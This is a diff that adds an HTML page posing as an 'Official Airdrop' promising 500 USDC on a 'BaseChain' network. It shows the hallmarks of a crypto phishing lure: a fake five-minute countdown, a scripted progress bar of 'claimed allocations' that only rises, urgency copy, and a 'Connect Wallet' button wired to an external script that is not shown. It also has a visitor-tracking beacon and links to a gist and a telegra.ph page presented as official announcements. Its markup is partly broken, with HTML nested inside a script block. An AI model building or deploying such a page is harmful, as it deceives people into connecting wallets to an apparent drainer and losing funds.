@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="description" content="连接钱包查看资格，最高500 USDC。限量2000名额">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="🎁 Official Airdrop - 500 USDC Claim Open">
+<meta property="og:description" content="Limited 2,000 allocations. Connect wallet to check eligibility. Ends soon.">
+<meta property="og:type" content="website">
+<title>🎁 BaseChain Airdrop — Official USDC Rewards Distribution</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:'Inter',system-ui,sans-serif; background:linear-gradient(135deg,#667eea,#1e40af); min-height:100vh; display:flex; align-items:center; justify-content:center; }
+        .card { background:white; border-radius:20px; padding:40px; max-width:420px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,.3); text-align:center; }
+        h1 { color:#333; font-size:24px; margin-bottom:10px; }
+        .amount { font-size:48px; font-weight:bold; color:#0052FF; margin:20px 0; }
+        .btn-connect { background:#0052FF; color:white; border:none; padding:16px 32px; border-radius:12px; font-size:18px; cursor:pointer; width:100%; transition:.3s; }
+        .btn-connect:hover { background:#5a4bd1; }
+        .timer { color:#e74c3c; font-weight:bold; margin-top:15px; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>🎉 Exclusive Airdrop</h1>
+    <div class="amount">500 USDC</div>
+    <p style="color:#666;margin-bottom:20px;">Connect wallet to claim your allocation<br><b>Limited spots remaining!</b></p>
+    <button class="btn-connect" onclick="connectWallet()">Connect Wallet</button>
+    <div class="timer">⏰ Expires in <span id="countdown">05:00</span></div>
+</div>
+
+<script src="/app.js"></script>
+<script>
+let timeLeft = 300;
+setInterval(() => {
+    timeLeft--;
+    const m = Math.floor(timeLeft/60), s = timeLeft%60;
+    document.getElementById('countdown').textContent = `${m}:${String(s).padStart(2,'0')}`;
+}, 1000);
+
+<div class="progress-wrap" style="margin-top:20px">
+  <div style="background:#eee;border-radius:8px;height:12px;overflow:hidden">
+    <div id="bar" style="width:73%;height:100%;background:linear-gradient(90deg,#0052FF,#a29bfe)"></div>
+  </div>
+  <small style="color:#888">1,432 / 2,000 allocations claimed</small>
+</div>
+<script>setInterval(()=>{const b=document.getElementById('bar');let w=73;w=Math.min(w+0.07,97);b.style.width=w+'%';},3000)</script>
+</script>
+<script>/* page_visit_beacon */
+navigator.sendBeacon('/api/collect',new Blob([JSON.stringify({event:'page_visit',ref:document.referrer,ua:navigator.userAgent.slice(0,80),ts:Date.now()})],{type:'application/json'}))
+</script>
+<div style="margin-top:25px;font-size:12px;color:#999">
+  📢 <a href="https://gist.github.com/datuichuhai/df8f2c269c20699ee255c6b42ac49cfe" target="_blank" style="color:#0052FF">Official Announcement (Gist)</a>
+   | <a href="https://telegra.ph/Eligible-wallets-can-claim-up-to-500-USDC-on-Base-network-10-05" target="_blank" style="color:#0052FF">Full Details (Telegraph)</a>
+</div></body>
+</html>
